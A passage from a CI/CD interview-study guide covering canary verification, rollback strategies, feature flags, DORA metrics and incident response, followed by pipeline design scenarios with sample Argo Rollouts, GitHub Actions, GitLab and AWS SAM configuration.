      count: 5
      failureLimit: 1          # abort/rollback after threshold breaches
      provider:
        prometheus:
          address: http://prometheus.monitoring:9090
          query: |
            sum(rate(http_requests_total{job="app",status=~"5.."}[2m]))
              / sum(rate(http_requests_total{job="app"}[2m]))
      successCondition: result[0] <= 0.01
```

The senior point: canary verification is *observability-driven*, so it's only as good as your metrics and your baseline comparison — which is why this ties directly into deploy observability.

### Q15. "How do you know a deploy is safe?" — walk me through your verification strategy end to end.

I'd layer it and be explicit about which gate catches what:

1. **On the PR (gate the merge):** lint, type-check, unit, contract, and fast integration tests against ephemeral dependencies (Testcontainers), plus secret/dependency/SAST scanning. Fast (< 5 min) and deterministic so the merge path stays quick and main stays green.
2. **On merge to main:** build the **immutable artifact once**, run the fuller e2e suite (sharded) against a per-PR/staging environment. This is the last chance to catch cross-system bugs cheaply.
3. **At deploy (gate the traffic shift):** deploy the artifact to a target without exposing users — a blue environment or a canary — and run **smoke tests** against it to prove config/secrets/connectivity are right in the real environment.
4. **During rollout (gate promotion):** progressive delivery — canary at 5%, with **automated canary analysis** comparing error rate/latency/saturation to the live baseline. Metrics regress → auto-abort and roll back.
5. **After rollout (ongoing):** synthetic monitoring and SLO alerting keep watching; deploy markers on dashboards let us correlate any metric change to this release.

The honest framing I'd give the interviewer: **no single layer proves safety.** Pre-merge tests prove the code is correct; smoke tests prove the deployment is wired up; canary analysis proves it behaves under real traffic; observability proves it *stays* healthy. "Safe" means each layer had its chance to say no, *and* I can undo the change in minutes if production disagrees with all of them. Confidence comes from the combination plus a fast rollback, not from any one green checkmark.

## Deploy Observability, Rollback & DORA

### Summary

**What this topic covers**

This topic is about what happens *around* and *after* the moment of deploy: watching a rollout with health checks and metrics, **automated rollback** driven by explicit failure criteria, **feature flags** to decouple deploy from release, and the **four DORA metrics** that measure whether your whole delivery system is any good. The 16 questions cover per-strategy rollback (blue-green flip-back, canary abort, rolling undo, GitOps git-revert), the roll-back vs roll-forward debate, deployment markers on dashboards, error budgets governing release pace, incident response and blameless postmortems for bad deploys, "you build it you run it" ownership, monitoring the pipeline itself, and — most heavily — the DORA framework: deployment frequency, lead time for changes, change failure rate, and time to restore (MTTR), what Elite vs Low performers look like, how to measure and *improve* each, and why they must be balanced rather than gamed. If **Testing & Verification** answered "how do you know a deploy is safe *before* traffic," this topic answers "how do you watch it, undo it, and measure whether your delivery is healthy over time."

**Mental model**

Deploying is not an event, it's a *supervised transition* with a defined success/failure signal and an undo button. Frame every deploy as: (1) a **hypothesis** — "this version is at least as healthy as the last one"; (2) an **observation window** — you watch error rate, latency, and saturation against a baseline; and (3) a **decision** — promote or roll back, ideally automated. The reliability goal isn't "never ship a bad deploy" (impossible) but "make bad deploys *cheap*": detect fast (observability), undo fast (immutable artifacts + a rollback strategy + feature flags), and learn (blameless postmortem). DORA is the scoreboard for this whole loop — it measures throughput (frequency, lead time) *and* stability (change failure rate, MTTR) together, precisely because you can trivially win one by sacrificing the other. Good CD improves all four at once because the same practices — small batches, automation, fast rollback — help both speed and stability.

**Key terms**

- **Automated rollback** — reverting a deploy automatically when predefined failure criteria (failing health checks, SLO/error-budget burn) are hit.
- **Roll back vs roll forward** — undo to the last known-good version vs ship a fix forward; rollback is usually faster and safer for a bad deploy.
- **Feature flag** — a runtime toggle that separates *deploying* code from *releasing* a feature; enables dark launches and instant kill-switches.
- **Deployment frequency** — how often you deploy to production; a throughput metric.
- **Lead time for changes** — time from code committed to code running in production; a throughput metric.
- **Change failure rate** — percentage of deploys that cause a degraded service requiring remediation (rollback, hotfix); a stability metric.
- **Time to restore / MTTR** — how long to recover service after a failure; a stability metric.
- **Error budget** — the allowed amount of unreliability (1 − SLO); when exhausted, release pace slows.
- **Deployment marker** — an annotation on a metrics dashboard marking when a deploy happened, to correlate changes to releases.
- **Blameless postmortem** — an incident review focused on systemic causes, not individual fault.
- **You build it, you run it** — the team that ships a service also operates and is on-call for it.
- **Baseline comparison** — evaluating a new version's metrics against the concurrently-running stable version.

**Why interviewers ask this**

This is where delivery meets operations, and it's the clearest senior/junior separator. Juniors can deploy; seniors can *watch* a deploy, *undo* it under pressure, and *measure* whether their delivery process is improving. Interviewers use DORA to check whether you think about delivery as a system with balanced trade-offs — a candidate who says "we deploy 50 times a day" without mentioning change failure rate is missing half the picture. They ask about automated rollback and feature flags to see whether you've internalized that MTTR, not zero-defect deploys, is the realistic reliability lever. And they ask about postmortems and ownership to gauge whether you understand the cultural half of DevOps. Platform interviewers especially want to hear you tie rollback and flags to *reducing MTTR and change failure rate*, i.e. connecting mechanism to metric.

**Common confusions**

- "Deploy and release are the same thing" — feature flags separate them: you can deploy code that's dark, then release by toggling.
- "Rollback means redeploy the old code from scratch" — with immutable artifacts it's re-pointing to the previous artifact/digest, which is far faster.
- "More deploys means less stable" — DORA data shows the opposite: elite performers deploy more *and* have lower change failure rates, because small batches are safer.
- "MTTR is about fixing the bug" — MTTR is about *restoring service*; rolling back or flag-killing restores service without fixing the bug yet.
- "DORA metrics can be optimized individually" — optimizing one in isolation (e.g. frequency) while ignoring stability is gaming, not improvement.
- "A postmortem should identify who caused it" — blameless postmortems target systemic causes; blame suppresses the honest reporting you need.

**What follows from this topic**

Rollback strategy is inseparable from deploy strategy (blue-green/canary/rolling) and from the **immutable-artifact** principle — you can only roll back cleanly to something you built once and kept. The metric-based gating here reuses the canary analysis from **Testing & Verification**. And the scenario questions in **Scenario & Best-Practice Playbooks** ("a bad deploy took 2 hours to notice," "our change failure rate is high") are direct applications of this topic — deploy observability, smoke tests, auto-rollback, and small batches are the standard fixes.

### Q1. How do you watch a deployment to know if it's healthy?

Gate the rollout on **readiness/health checks** first (Kubernetes won't send traffic to a pod that fails its readiness probe, and a rolling update pauses if new pods never become ready), then watch the **golden signals** on the new version specifically, compared to a baseline:

- **Error rate** — 5xx / total, on the new version vs the stable version at the same time.
- **Latency** — p95/p99, not the average (averages hide tail regressions).
- **Saturation** — CPU, memory, connection pool; a new version that's healthy at 5% traffic can fall over at 100%.
- **Traffic/throughput** — confirm the new version is actually receiving requests.

The key discipline is **baseline comparison**: judge the canary against the stable version running *concurrently*, not against yesterday's numbers, so you control for time-of-day and traffic patterns. Add a **deployment marker** on your dashboards so any metric change is visually tied to the deploy. If you're doing progressive delivery, this watching is automated (canary analysis) and wired to rollback; if not, at minimum a human watches dashboards for a defined bake period before calling the deploy good. This is a direct application of the observability primer — deploys are just the highest-value thing to observe.

### Q2. How do you implement automated rollback, and what should trigger it?

Automated rollback needs three things: **explicit failure criteria**, a **mechanism** to revert, and something *watching* that flips the switch.

**Failure criteria** — define them upfront and make them measurable: readiness/health checks failing on the new version, error rate above a threshold relative to baseline, p95 latency regression, or **SLO/error-budget burn rate** crossing a limit. Vague criteria ("looks bad") can't be automated.

**Mechanism** — depends on strategy (see Q3), but always relies on the previous version being an **immutable artifact you can re-point to**, not a rebuild.

**Watcher** — a progressive-delivery controller (Argo Rollouts, Flagger) runs canary analysis on an interval and aborts on breach; or a deployment step runs post-deploy smoke tests and rolls back on failure.

```yaml
# Argo Rollouts — canary that auto-aborts on the analysis in Q14 of the previous topic
apiVersion: argoproj.io/v1alpha1
kind: Rollout
spec:
  strategy:
    canary:
      steps:
        - setWeight: 5
        - pause: { duration: 5m }
        - analysis: { templates: [{ templateName: error-rate }] }  # abort → rollback
        - setWeight: 25
        - pause: { duration: 5m }
        - setWeight: 50
        - pause: { duration: 5m }
```

The goal is to make rollback the *default reaction to a failing criterion*, requiring no human to be awake and correct at 3am.

### Q3. How does rollback differ across deployment strategies?

Each strategy has a distinct, and differently fast, undo:

| Strategy | Rollback mechanism | Speed |
|---|---|---|
| **Recreate** | Redeploy old version (downtime again) | Slow — full redeploy, another outage |
| **Rolling** | `kubectl rollout undo` — reverse the update to the previous ReplicaSet | Medium — pods cycle back gradually |
| **Blue-green** | Flip the router/service back to the old (blue) environment | Instant — traffic switch, old env still warm |
| **Canary** | Abort: set canary weight to 0, all traffic stays/returns to stable | Instant — you never fully committed |
| **GitOps (ArgoCD/Flux)** | `git revert` the change; the controller reconciles back to the previous desired state | Fast — a revert commit, then reconcile |

Blue-green and canary give the fastest, safest rollback because the previous version is still running and healthy — you're switching traffic, not resurrecting anything. GitOps rollback is a `git revert` (which also keeps your audit trail honest — the revert is a first-class commit). The universal precondition across all of them: **build once, keep the artifact immutable**, so "roll back" means "route to / redeploy the exact previous digest," never "rebuild and hope it's the same."

### Q4. Rollback vs roll-forward — when do you choose each?

**Roll back** — revert to the last known-good version. Default choice for a *bad deploy* because it's fast, low-risk (you're returning to something proven), and restores service without needing to understand the bug first. When production is degraded, restore service, *then* diagnose.

**Roll forward** — ship a fix on top. Choose it when rollback is impossible or itself risky: an irreversible **database migration** already ran, the previous version is incompatible with a schema change, or the "bug" is data corruption that reverting won't undo. Also the pragmatic choice for a trivial, well-understood fix that's faster to ship than to revert-and-re-fix.

The senior nuance is migrations: forward-only, backward-compatible schema changes (expand/contract pattern — add columns, deploy code that tolerates both shapes, backfill, then remove) are what *keep rollback available*. If your deploy couples an irreversible migration to the code change, you've forfeited your fastest recovery tool. So the answer is "roll back by default, and design migrations so that staying able to roll back is always an option."

### Q5. How do feature flags decouple deploy from release, and why does that matter?

**Deploy** = the code is running in production. **Release** = users can see the feature. Feature flags put a runtime toggle between them: you deploy code with the new feature *behind a flag that's off*, so it ships dark, exercised by no users, then you **release** by flipping the flag — for internal users first, then 1%, then everyone — with **no redeploy**.

Why it matters for CD:

- **Decouples risk** — deploying becomes boring (dark code), and releasing becomes gradual and reversible independent of the deploy pipeline.
- **Instant kill-switch** — if a released feature misbehaves, toggle it off in seconds. This is a *release* rollback that doesn't touch the deployment and dramatically cuts **MTTR**.
- **Progressive rollout at the feature level** — canary the *feature* to a cohort, not just the *binary* to some pods.
- **Enables trunk-based development** — merge incomplete work to main behind a flag, keeping branches short-lived.

The cost is flag hygiene: flags are debt, so you retire them once a feature is fully rolled out, and you keep flag state auditable. But the reliability payoff — turning "emergency redeploy" into "toggle off" — is why flags are one of the highest-leverage tools for lowering MTTR and de-risking deploys.

### Q6. Explain the four DORA metrics and what they measure.

DORA (DevOps Research and Assessment) identified four metrics that together predict software delivery performance, split into **throughput** and **stability**:

| Metric | Measures | Type | Elite |
|---|---|---|---|
| **Deployment frequency** | How often you deploy to prod | Throughput | On-demand, multiple/day |
| **Lead time for changes** | Commit → running in prod | Throughput | < 1 day (hours) |
| **Change failure rate** | % of deploys causing degraded service needing remediation | Stability | 0–15% |
| **Time to restore (MTTR)** | How long to recover from a failure | Stability | < 1 hour |

The insight that made DORA influential: **throughput and stability are not in tension** — elite performers score well on *all four*. Deploying more often and faster correlates with *lower* failure rates and *faster* recovery, because the underlying practices (small batches, automation, testing, fast rollback) improve both at once. That's why you must read the four together: two speed metrics and two stability metrics, deliberately paired so you can't claim excellence by sacrificing one for the other.

### Q7. Elite vs Low performers — what do the DORA numbers actually look like, and how do you move up?

Roughly, the bands span orders of magnitude:

| | Deploy frequency | Lead time | Change failure rate | MTTR |
|---|---|---|---|---|
| **Elite** | On-demand, many/day | < 1 hour–1 day | 0–15% | < 1 hour |
| **High** | Daily–weekly | 1 day–1 week | 16–30% | < 1 day |
| **Medium** | Weekly–monthly | 1 week–1 month | ~ | 1 day–1 week |
| **Low** | Monthly or less | 1–6 months | high | > 1 week |

Moving up is about the practices, not the numbers directly:

- **Frequency + lead time** — smaller batches, trunk-based development, automated pipeline end to end, remove manual gates that don't add safety.
- **Change failure rate** — better automated testing, canary/progressive delivery, small changes that are easy to reason about.
- **MTTR** — deploy observability (fast detection), automated rollback, feature-flag kill-switches, rehearsed incident response.

The trap is chasing a number in isolation — e.g. deploying more often without investing in testing and rollback will spike your change failure rate. Improve the *system* (batch size, automation, observability) and all four move together.

### Q8. Our change failure rate is high — how would you bring it down?

I'd attack batch size and safety nets, in this order:

1. **Shrink the batch** — large, infrequent deploys bundle many changes, so any failure is hard to attribute and more likely. Deploy smaller changes more often (which, per DORA, *improves* both stability and throughput). Trunk-based development with short-lived branches is the enabler.
2. **Strengthen automated verification** — if bad changes reach prod, the pre-merge and pre-deploy gates are too weak: add integration/contract tests, tighten what gates the merge, run smoke tests post-deploy (see the verification topic).
3. **Progressive delivery** — canary with automated analysis so a bad change is caught at 5% traffic and auto-aborted, which reclassifies many "failures" as "aborted rollouts that never hit most users."
4. **Feature flags** — decouple release from deploy so a risky change ships dark and is enabled gradually with a kill-switch.
5. **Look at the failures** — categorize recent change failures in postmortems; if they cluster (e.g. config errors, missing migrations), fix the systemic cause (config validation, migration checks) rather than treating each as one-off.

The framing for the interviewer: high change failure rate is a *process* signal, not a "people need to be more careful" signal. The fix is smaller batches plus stronger automated gates plus progressive delivery — the same practices that also raise deploy frequency.

### Q9. How do observability, rollback, and feature flags each reduce MTTR?

MTTR = detect + diagnose + restore. Each tool attacks a different term:

- **Observability reduces *detect* time** — golden-signal alerting, SLO burn-rate alerts, deploy markers, and synthetic checks mean you find out in seconds/minutes, not when a customer tweets. A bad deploy that takes 2 hours to notice has a huge MTTR no matter how fast your rollback is.
- **Fast rollback reduces *restore* time** — with immutable artifacts and blue-green/canary, restoring service is a traffic flip, not an investigation. Critically, you **restore before you diagnose** — get users healthy, then find the bug.
- **Feature flags reduce *restore* time to seconds** — toggling a feature off is faster than any deploy-based rollback and doesn't require a pipeline run.

The senior point: MTTR is the reliability lever you can actually pull, because you can't drive change failure rate to zero. Investing in detection + fast undo means even a bad deploy is a minor, brief blip. That's why these three show up together — they're the MTTR toolkit.

### Q10. What are deployment markers/annotations and why are they useful?

A deployment marker is an **annotation on your metrics dashboards recording exactly when a deploy happened** (version, commit sha, who/what triggered it). Grafana annotations, Datadog deploy events, and Honeycomb markers all do this.

They're useful because the single most common operational question is *"this metric changed — was it a deploy?"* Without markers you're eyeballing timestamps across systems; with them, a latency spike lines up visually against the release that caused it, turning a 30-minute correlation hunt into a glance. They make **causation between a release and a regression** obvious, which speeds both detection and the decision to roll back — directly lowering MTTR.

```bash
# emit a deploy marker to the metrics backend at the end of the deploy job
curl -fsS -XPOST https://api.datadoghq.com/api/v1/events \
  -H "DD-API-KEY: $DD_API_KEY" -H 'Content-Type: application/json' \
  -d "{\"title\":\"deploy app\",\"text\":\"sha ${GITHUB_SHA} to prod\",\"tags\":[\"service:app\",\"env:prod\"]}"
```

Wiring the marker into the pipeline (not a manual step) means every deploy is annotated automatically, so the correlation is always available when you need it.

### Q11. What role do error budgets play in governing release pace?

An **error budget** is the inverse of your SLO: if the SLO is 99.9% availability, the budget is the 0.1% of allowed unreliability over the window. It turns reliability into a *quantity you can spend*, and that quantity governs how aggressively you ship.

The mechanism (the SRE tie-in): while there's budget remaining, the team ships freely — take risks, deploy often, that's what the budget is *for*. When the budget is **exhausted** (too many incidents/errors this period), the policy is to **slow the release pace** — freeze risky features, redirect effort to reliability work — until the budget recovers. This creates a self-regulating balance between the DORA throughput metrics (frequency, lead time) and stability, replacing the endless "ship fast vs stay stable" argument with a data-driven rule.

For deploys specifically, error budgets can *gate progressive rollouts*: if burning the budget too fast, halt the canary. It aligns incentives — dev wants to ship, SRE wants stability, and the budget is the shared contract that says "you can ship as fast as you want *as long as* you're within budget."

### Q12. Walk me through incident response for a bad deploy.

I'd run the standard detect → mitigate → resolve → learn loop, with deploy-specific moves:

1. **Detect** — alert fires (SLO burn, error-rate spike). Deploy markers immediately show a release just went out; correlation is my first hypothesis.
2. **Mitigate first, diagnose later** — restore service before understanding root cause. If it's the recent deploy: **roll back** (blue-green flip / canary abort / `rollout undo` / `git revert`) or **kill the feature flag**. This is the MTTR-defining step — get users healthy in minutes.
3. **Communicate** — declare the incident, assign an incident commander, keep a status channel/timeline updated so responders don't collide.
4. **Verify recovery** — confirm the golden signals returned to baseline after the rollback; run smoke tests against the restored version.
5. **Resolve** — once stable, work the actual fix (roll forward) at a calm pace, re-verified through the normal pipeline.
6. **Learn** — a **blameless postmortem**: timeline, contributing causes, and concrete action items (better gate, missing smoke test, automate the rollback that was manual).

The interview-worthy emphasis: *mitigate before diagnose*, and lean on rollback/flags so the mitigation is fast and boring. Heroic live-debugging in production is a failure mode, not a badge.

### Q13. Why are blameless postmortems important for deploy failures?

Because the goal is to fix the *system*, and blame poisons the information you need to do that. If engineers fear being punished for a bad deploy, they hide details, under-report near-misses, and get defensive — exactly when you need candid, complete timelines.

A blameless postmortem assumes everyone acted reasonably given what they knew, and asks *"what about our system let this happen and let it happen for this long?"* — not *"who pushed the button?"* For deploys that surfaces the real gaps: a missing smoke test, a gate that wasn't required, a rollback that was manual and slow, an alert that didn't fire. The output is **concrete, owned action items** that make the *next* deploy safer (add the test, automate the rollback, tighten the gate), plus honest DORA data (accurately counting the change failure without incentivizing people to hide it).

The cultural point ties to DevOps: you want a learning organization where failure is data. That only works if surfacing failure is safe.

### Q14. What does "you build it, you run it" mean for deploys and observability?

Coined at Amazon, it means the team that **builds** a service also **operates** it — including being on-call for it in production. There's no separate ops team that inherits the pager for code they didn't write.

For deploys and observability this changes incentives profoundly:

- Developers who carry the pager **instrument their code well** — they want good metrics, logs, and traces because *they* get woken up.
- They **care about deployability and rollback** — safe deploys, feature flags, and fast recovery are self-interest, not someone else's problem.
- **Fast feedback loop** — the people who can fix a problem are the people who feel it, so operational quality improves continuously.

It's the organizational counterpart to the technical practices in this topic: DORA metrics, blameless postmortems, and error budgets all assume the team owns the outcome of its deploys end to end. The failure mode it prevents is the classic wall-throw — dev optimizes for shipping, ops eats the instability — which reliably produces high change failure rates and slow MTTR.

### Q15. How do you monitor the CI/CD pipeline itself, and which metrics matter?

The pipeline is production infrastructure for your engineers; treat it as an observable system:

- **Build/deploy success rate** — a falling success rate on `main` signals instability; a chronically red main is a productivity emergency.
- **Pipeline duration** — total lead-time contributor; track p50/p95 and watch for creep (it's the "45-minute pipeline" problem before it's a crisis).
- **Queue/wait time** — time jobs spend waiting for a runner; high values mean you need more/bigger runners.
- **Flaky-test rate** — tests failing non-deterministically; a rising rate erodes trust in every gate.
- **DORA-adjacent** — deployment frequency and lead time are partly *measured from* the pipeline.
- **Cost** — runner minutes, especially with paid CI; parallelization has a bill.

These are meta-metrics: they measure your ability to deliver, which is upstream of every product metric. A pipeline that's slow, flaky, or frequently red directly degrades deployment frequency and lead time, so instrumenting it (most CI platforms expose these, or export to Prometheus/Datadog) and setting targets is how you keep the delivery *system* healthy, not just the product.

### Q16. Why does simply *measuring* DORA metrics change team behavior, and what's the risk?

Measuring makes the delivery process **visible and comparable**, which focuses attention: once a team sees its lead time is a week while peers ship in hours, the bottlenecks (manual approvals, slow tests, big batches) become concrete targets instead of vague grumbling. The metrics give a shared, evidence-based language for prioritizing platform investment — "we should automate this gate" stops being opinion and becomes "this is our lead-time bottleneck."

The risk is **Goodhart's law**: when a measure becomes a target, it stops being a good measure. Optimize deployment frequency alone and people split changes artificially or deploy no-ops; target MTTR alone and people under-report incidents or resolve them "on paper." This is exactly why DORA pairs throughput *and* stability — the four are a **balanced set** that makes gaming self-defeating (juice frequency by skipping tests and your change failure rate exposes you). The correct use is: measure all four together, track *trends* not absolute leaderboards, and treat them as a diagnostic to find systemic improvements — never as individual performance scores, which turns them into a fear metric and destroys the honest reporting they depend on.

## Scenario & Best-Practice Playbooks

### Summary

**What this topic covers**

This is the capstone: the "design this / walk me through it / spot the anti-pattern" questions that synthesize everything in the primer. The 17 questions split into two modes. **Design scenarios** — build a concrete pipeline for a containerized Kubernetes web app, a monorepo, a serverless app, a mobile app, and a library; set up zero-downtime deploys with automated rollback; add a prod-only approval; speed up a slow pipeline; and make deploys safe for a risk-averse fintech. **Spot-the-anti-pattern / debug** — diagnose and fix real smells: per-environment rebuilds, whole-site-down deploys, long-lived AWS keys in repo secrets, fork-PR secret exfiltration, a chronically broken main, ignored flaky tests, no rollback path, click-ops/snowflake servers, a bad deploy noticed two hours late, and a 12-step manual release. Each answer gives a concrete pipeline sketch (GitHub Actions / GitLab YAML), a CLI/decision tree, or a named anti-pattern with its fix. This topic is where you prove you can *apply* CI, CD, artifacts, strategies, security, verification, observability, and DORA under interview pressure.

**Mental model**

Every CI/CD design question can be answered with the same five-part spine, adapted to the artifact type: **(1) What's the artifact?** (container image, zip, npm package, mobile binary) — and build it *once*, immutably. **(2) How do you test it?** (the verification layers — gate the merge on fast checks). **(3) How does it reach prod safely?** (promote the same artifact through environments; choose a deploy strategy — rolling/blue-green/canary; push vs GitOps pull). **(4) How do you roll back?** (strategy-specific undo + feature flags). **(5) How do you secure it?** (OIDC not long-lived keys, least-privilege tokens, no secrets to forks, signed/scanned artifacts). Run any prompt through that spine and you'll produce a coherent design. For anti-pattern questions, the spine also tells you *which* principle is being violated — "rebuilds per env" breaks (1) build-once; "site goes down" breaks (3) safe strategy; "long-lived keys" breaks (5).

**Key terms**

- **Build once, promote the digest** — build the artifact a single time and move the *same* immutable digest through environments; never rebuild per env.
- **GitOps** — Git as the source of truth; an in-cluster agent (ArgoCD/Flux) *pulls* and reconciles desired state.
- **Affected-only builds** — in a monorepo, build/test/deploy only the packages a change touched.
- **Merge queue** — serializes merges and re-runs required checks against the actual merge result to keep main green.
- **OIDC** — short-lived, federated cloud credentials issued to the pipeline per run, replacing stored long-lived keys.
- **`pull_request_target` / PPE** — a trigger/poisoned-pipeline-execution class where fork PRs can run with base-repo secrets; a critical footgun.
- **Trunk-based development** — everyone integrates to a shared main frequently via short-lived branches.
- **Blue-green / canary / rolling** — the three core zero-downtime strategies, differing in rollback speed and blast radius.
- **Pipeline-as-code** — the pipeline defined in version-controlled files, not clicked together in a UI.
- **Snowflake server** — a manually-configured, un-reproducible host; the opposite of immutable infrastructure.
- **Argo Rollouts** — a Kubernetes controller for canary/blue-green with automated metric analysis.
- **Path filters** — CI rules that trigger jobs only when certain files change (monorepo affected detection).

**Why interviewers ask this**

Scenario questions are the highest-signal part of a CI/CD interview because they can't be answered by reciting definitions — you have to *compose* the concepts under time pressure and defend trade-offs. Interviewers watch for the spine: does the candidate anchor on the artifact and build-once, choose a deploy strategy with a *reason*, and remember rollback and security unprompted? Anti-pattern questions test whether you can look at a real (broken) setup and name what's wrong *and* fix it — the daily job of a platform engineer. Seniors give concrete YAML and name specific failure modes (PPE, snowflake, per-env rebuild); juniors stay abstract or miss the security/rollback dimensions. This topic is also where "have you actually run production pipelines?" gets answered — the details (image signing, OIDC, merge queues, affected builds) are hard to fake.

**Common confusions**

- "Design a pipeline" means "list the stages" — no; it means artifact + test + safe delivery + rollback + security, with a strategy chosen for a reason.
- "Zero-downtime" just means rolling updates — rolling avoids downtime but blue-green/canary add *fast rollback and metric-gated safety*; pick per risk tolerance.
- "We rebuild for prod to be safe" — rebuilding per env *breaks* safety by producing a different artifact than you tested.
- "Repo secrets are secure enough for cloud creds" — long-lived keys in secrets are a top breach vector; OIDC removes the stored credential.
- "Fork PRs are harmless" — with `pull_request_target` or a checkout of untrusted code in a privileged job, a fork PR can exfiltrate secrets.
- "A manual approval makes deploys safe" — approvals help for prod, but real safety comes from tests, strategy, and rollback; an approval on a broken pipeline just delays the breakage.

**What follows from this topic**

Nothing follows — this is the synthesis. It draws the artifact/build-once principle from the fundamentals, the strategies from the deployment-strategy topic, OIDC/secrets/PPE from the security topic, the verification layers from **Testing & Verification**, and rollback/observability/DORA from **Deploy Observability, Rollback & DORA**. If you can answer this topic's questions fluently, you can hold a senior CI/CD conversation; if you can't, the gap points you back to whichever upstream topic you fumbled.

### Q1. Design a full CI/CD pipeline for a containerized web app on Kubernetes.

I'd anchor on the spine: artifact → test → safe delivery → rollback → security.

**PR checks (gate the merge):** lint, type-check, unit + contract tests, fast integration against Testcontainers, plus SAST/secret/dependency scanning. Fast and deterministic.

**On merge to main — build once:** build the container image, scan it (Trivy), **sign it** (cosign), and push to the registry tagged by git-sha/digest. This is the immutable artifact; nothing downstream rebuilds it.

**Deploy via GitOps:** CI updates the image digest in a Git config repo; **ArgoCD** pulls and reconciles it into the cluster. Git is the source of truth and the audit log.

**Progressive rollout with Argo Rollouts:** canary 5% → analysis (error rate/latency vs baseline) → 25% → 50% → 100%, with **automated rollback** on metric breach.

**Security:** **OIDC** to the registry/cloud (no long-lived keys), least-privilege `GITHUB_TOKEN`, signed images verified by an admission policy.

```yaml
# GitHub Actions — build once, sign, push, bump GitOps repo
name: release
on: { push: { branches: [main] } }
permissions: { contents: read, id-token: write, packages: write }  # id-token = OIDC
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/build-push-action@v6
        id: push
        with: { push: true, tags: "ghcr.io/acme/app:${{ github.sha }}" }
      - run: trivy image --exit-code 1 --severity CRITICAL ghcr.io/acme/app:${{ github.sha }}
      - uses: sigstore/cosign-installer@v3
      - run: cosign sign --yes ghcr.io/acme/app@${{ steps.push.outputs.digest }}
      - run: |                                   # bump digest in GitOps repo → ArgoCD reconciles
          yq -i '.image.digest = "${{ steps.push.outputs.digest }}"' k8s/app/values.yaml
          git commit -am "app ${{ github.sha }}" && git push
```

The one-liner summary: **build+sign once, promote the digest via GitOps, canary with auto-rollback, authenticate with OIDC.**

### Q2. Design a CI/CD pipeline for a monorepo.

The core challenge is *not rebuilding and redeploying everything on every change*. The answer is **affected-only** builds driven by what actually changed.

- **Change detection** — use path filters or a monorepo tool (Nx/Turborepo `affected`, Bazel) to compute the set of packages impacted by a commit, including dependents.
- **Per-package jobs** — build/test/deploy only affected packages, in parallel; unaffected packages are skipped (or restored from cache).
- **Per-package release** — each package versions and releases independently (independent tags/artifacts), so a change to `web` doesn't force a release of `api`.
- **Shared caching** — remote build cache so unchanged packages return instantly across runs.

```yaml
# GitLab CI — path rules trigger only the affected component's job
stages: [test, build, deploy]
web-test:
  stage: test
  rules: [{ changes: ["packages/web/**/*"] }]   # only when web changes
  script: [nx test web]
api-test:
  stage: test
  rules: [{ changes: ["packages/api/**/*"] }]
  script: [nx test api]
```

```yaml
# GitHub Actions equivalent with a filter action
- uses: dorny/paths-filter@v3
  id: changes
  with:
    filters: |
      web: ['packages/web/**']
      api: ['packages/api/**']
- if: steps.changes.outputs.web == 'true'
  run: nx build web
```

The failure mode to name: a monorepo that rebuilds/redeploys the whole world per commit — it wastes runner minutes, slows feedback, and couples independent services' release cadence. Affected-only builds + remote cache + independent releases fix it.

### Q3. Design a CI/CD pipeline for a serverless application.

Same spine, different artifact and deploy mechanism. The "artifact" is your function code + dependencies (a zip or container image) plus infrastructure defined as code (SAM/Serverless Framework/Terraform/CDK).

- **PR checks:** unit + integration tests (LocalStack or mocked cloud), lint, IaC validation (`sam validate`, `cdk synth`), security scan of dependencies.
- **Build once:** package the function bundle/image once, versioned; publish it.
- **Deploy through stages:** deploy the *same* package to dev → staging → prod. For Lambda, publish an immutable **version** and shift traffic with **aliases** using weighted routing — this gives you canary at the function level.
- **Safe rollout + rollback:** Lambda alias weighting (10% → 100%) with CloudWatch alarms; **auto-rollback** on alarm (SAM/CodeDeploy `AutoRollbackConfiguration`). Rollback = repoint the alias to the previous version — instant.
- **Security:** OIDC to assume a deploy role; least-privilege per function.

```yaml
# AWS SAM canary deploy with automatic rollback on alarm
Resources:
  Fn:
    Type: AWS::Serverless::Function
    Properties:
      AutoPublishAlias: live
      DeploymentPreference:
        Type: Canary10Percent5Minutes         # 10% for 5 min, then 100%
        Alarms: [!Ref ErrorAlarm]              # breach → auto-rollback to prev version
```

The serverless-specific wins: versions are immutable by construction, alias weighting is built-in canary, and rollback is a metadata flip — but watch cold starts, per-function IAM least privilege, and that "no servers" still means IaC and the same build-once discipline.

### Q4. Design a CI/CD pipeline for a mobile app and for a library — how do they differ from a web service?

Both break the "deploy = we control prod" assumption, so the *release* half changes.

**Mobile app:**
- **Build:** compile a signed binary (`.ipa`/`.aab`) once, per platform; manage signing certs/keystores as secrets. Tools: Fastlane, EAS.
- **Test:** unit + UI tests on device farms (emulators/simulators, then real devices).
- **Distribute, don't deploy:** you submit to App Store / Play Store review — there's a **gatekeeper and a delay** you don't control. Ship to TestFlight/internal tracks first (beta), then staged rollout (Play Store phased release: 5% → 100%).
- **Rollback is hard** — you can't recall an installed app; you halt the staged rollout and ship a fix-forward. This makes **feature flags** and **server-driven config** essential — they're your only real "rollback" for a bug in a shipped binary.

**Library / package:**
- **Artifact:** a versioned package (npm/PyPI/Maven) — immutable once published; you *cannot* overwrite a published version.
- **Release:** on a tag, publish to the registry with **provenance/signing**; **semantic versioning** is the contract with consumers.
- **"Deploy" = publish;** there's no environment. Verification shifts to *compatibility*: test across supported runtime versions (matrix build), and never republish a version — bump instead.

The common thread: for both, you don't own the runtime, so **staged rollout + fix-forward + flags** replace instant rollback, and the release gate (store review / semver contract) is external.

### Q5. Set up zero-downtime deploys with automated rollback — walk me through it.

Zero-downtime needs a strategy where old and new run simultaneously and traffic shifts only to healthy instances; automated rollback needs metric-based criteria wired to an undo.

**On Kubernetes, canary is my default:**

1. Deploy the new version alongside the stable one (new pods must pass **readiness probes** before receiving traffic — that alone prevents the naive "site goes down" failure).
2. Shift a small weight (5%) to the canary.
3. **Analyze** — automated canary analysis compares error rate/latency/saturation against the concurrent baseline over a bake window.
4. Healthy → ramp (25/50/100). Unhealthy → **abort and roll back automatically** (set canary weight to 0; stable was always serving).

```yaml
# Argo Rollouts — canary with automated analysis gating each step
apiVersion: argoproj.io/v1alpha1
kind: Rollout
spec:
  strategy:
    canary:
      steps:
        - setWeight: 5
        - pause: { duration: 5m }
        - analysis: { templates: [{ templateName: error-rate }] }  # abort → rollback
        - setWeight: 50
        - pause: { duration: 5m }
```

